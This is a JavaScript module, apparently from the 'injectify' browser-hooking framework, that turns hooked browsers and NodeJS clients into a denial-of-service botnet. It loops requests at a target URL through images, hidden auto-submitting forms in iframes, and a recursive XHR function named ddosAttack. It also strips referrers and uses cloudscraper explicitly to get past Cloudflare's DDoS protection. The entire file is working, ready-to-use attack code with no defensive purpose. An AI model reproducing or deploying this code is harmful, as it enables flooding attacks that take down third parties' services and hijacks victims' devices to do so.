import ModuleTypings from '../../../definitions/module'
declare const { Module, injectify }: ModuleTypings

let request = {
  method: 'GET',
  url: Module.params,
  body: '',
  params: null,
  type: 'application/x-www-form-urlencoded',
  interval: 30,
  random: true
}

/**
 * Functions
 */
let serialize = (obj) => {
  let str = []
  for (let p in obj)
    if (obj.hasOwnProperty(p)) {
      str.push(`${encodeURIComponent(p)}=${encodeURIComponent(obj[p])}`)
    }
  return str.join('&')
}

/**
 * Parse the parameters
 */
if (typeof Module.params == 'object') {
  request = {
    ...request,
    ...Module.params
  }

  request = {
    ...request,
    method: request.method.toUpperCase()
  }

  if (request.body || request.params) {
    if (!request.body) request.body = request.params
    /**
     * Convert object parameters into query string
     */
    if (request.type === 'application/x-www-form-urlencoded') {
      if (typeof request.body === 'string') {
        /**
         * Remove proceeding ?
         */
        if (request.body.slice(0, 1) === '?') request.body = request.body.slice(1)
      } else if (typeof request.body === 'object') {
        request.body = serialize(request.body)
      }
    }
    /**
     * Stringify JSON
     */
    if (request.type === 'application/json') {
      request.body = JSON.stringify(request.body)
    }
    request.body = request.body
  }
}

if (injectify.info.platform === 'browser') {
  /**
   * Prevent referrer from being sent in the requests
   */
  let meta = document.createElement('meta')
  meta.name = 'referrer'
  meta.content = 'no-referrer'
  document.head.appendChild(meta)

  if (request.url) {
    if (request.method === 'GET') {
      /**
       * Request the target url
       */
      setInterval(() => {
        /**
         * Parse the target url
         */
        let url =
          typeof request.url === 'function' ? request.url() : request.url
        if (request.body || request.random) {
          if (url.includes('?')) {
            /**
             * Target url already contains parameters
             */
            if (url.slice(-1) !== '&') url += '&'
          } else {
            /**
             * Target url doesn't contain parameters
             */
            url += '?'
          }
          /**
           * Parse the parameters
           */
          if (request.body) {
            url += request.body
            if (request.random) url += '&'
          }
        }

        /**
         * Add a query string to prevent the server from sending a cached response
         */
        if (request.random)
          url += +new Date()

        /**
         * Make a request
         */
        let req = new Image()
        req.src = url
        req.onload
      }, request.interval)
      Module.resolve()
    } else {
      if (
        request.method === 'POST' &&
        request.type === 'application/x-www-form-urlencoded'
      ) {
        /**
         * POST request through a hidden form element
         */
        let form = document.createElement('form')
        let frameName = +new Date()
        form.setAttribute('action', request.url)
        form.setAttribute('method', request.method)
        form.setAttribute('target', frameName.toString())

        /**
         * Create the form elements
         */
        let params = request.body.split('&')
        for (let i in params) {
          /**
           * Parse the parameters
           */
          let param = params[i].split('=')
          let value = decodeURIComponent(param[1])
          /**
           * Create input element
           */
          let input = document.createElement('input')
          input.setAttribute('name', decodeURIComponent(param[0]))
          input.setAttribute('value', value)
          /**
           * Append to the form
           */
          form.appendChild(input)
        }
        /**
         * Make request
         */
        injectify
          .module('embed', {
            hidden: true
          })
          .then((embed) => {
            embed.setAttribute(
              'srcdoc',
              `<body onload="document.getElementsByTagName('form')[0].submit()">${
                form.outerHTML
              }<iframe name="${frameName}" onload="console.log(1);if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${
                request.interval
              })}"/></body>`
            )
          })
      } else {
        /**
         * Custom request
         */
        ;(function ddosAttack() {
          let XHR = new XMLHttpRequest()

          XHR.open(request.method, request.url, true)
          XHR.setRequestHeader('Content-type', request.type)

          XHR.onreadystatechange = () => {
            setTimeout(ddosAttack, request.interval)
          }
          XHR.send(request.body)
        })()
        Module.resolve()
      }
    }
  } else {
    Module.reject('No url specified')
  }
} else {
  /**
   * NodeJS enabled client
   * Use cloudscraper to circumvent cloudflare DDoS prevention
   */
  let cloudscraper = eval(`require('cloudscraper')`)
  ;(function ddosAttack(thread) {
    let requestUrl = request.url
    if (request.random) requestUrl += `?${+new Date()}`
    cloudscraper.get(requestUrl, (error, response, body) => {
      /**
       * Move out of callstack
       */
      if (thread == 1) {
        setTimeout(() => {
          ddosAttack(1)
        }, 0)
      }
    })
    if (thread == 1) {
      cloudscraper.get(requestUrl, () => {
        ddosAttack(2)
      })
      cloudscraper.get(requestUrl, () => {
        ddosAttack(3)
      })
      cloudscraper.get(requestUrl, () => {
        ddosAttack(4)
      })
      cloudscraper.get(requestUrl, () => {
        ddosAttack(5)
      })
    }
  })(1)
}
